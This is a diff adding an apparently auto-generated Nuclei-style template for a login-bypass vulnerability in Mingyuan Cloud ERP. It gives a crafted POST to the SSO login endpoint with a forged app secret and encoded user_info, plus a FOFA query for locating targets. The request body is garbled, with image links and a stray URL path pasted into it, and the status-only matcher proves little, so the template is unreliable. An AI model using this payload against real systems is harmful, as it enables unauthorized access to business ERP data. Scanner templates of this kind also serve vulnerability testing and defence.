@@ -1,0 +1,32 @@
+id: poc-ep983n7ztxga24hz
+info:
+  name: 明源云ERP系统存在登录绕过漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ep983n7ztxga24hz'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ep983n7ztxga24hz
+    fofa: app="明源云-ERP"
+http:
+- raw:
+  - 'POST /PubPlatform/nav/login/sso/login.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 81
+
+
+    __yzsAppSecret=testtest&user_info=fymq5bIcxXZIxu6KllsFIR2ZwEJK%2BVE95Dkx%2FCnFgFQ%3D
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711581124-ab6a18cf-8ac4-4519-87e4-7c4fbc497693.png)
+
+    /PubPlatform/nav/home/default?_nav=0000![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711581353-05ad9ba9-111d-4215-add8-fd373b964c44.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
